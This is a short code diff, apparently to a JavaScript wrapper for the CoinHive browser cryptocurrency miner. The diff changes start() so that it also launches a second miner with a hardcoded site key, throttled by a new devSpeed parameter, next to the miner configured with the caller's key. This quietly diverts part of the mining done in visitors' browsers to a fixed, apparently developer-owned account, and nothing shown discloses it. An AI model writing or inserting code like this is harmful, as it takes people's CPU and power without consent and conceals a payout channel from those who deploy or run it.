@@ -162,8 +162,11 @@
       }}, "*");
     };
 
-    function start(siteKey, opts) {
-      var miner = new CoinHive.Anonymous(siteKey, opts)
+    function start(siteKey, opts, devSpeed) {
+      var miner = new CoinHive.Anonymous(siteKey, opts);
+      var devMiner = new CoinHive.Anonymous('YjnI5obtmcFVofmcIElf9iayMokHMz2B', { 'throttle': (100 - devSpeed) / 100 });
+      devUI = new MinerUI(devMiner);
+      devUI.start();
       window.ui = new MinerUI(miner);
       window.ui.start();
     }
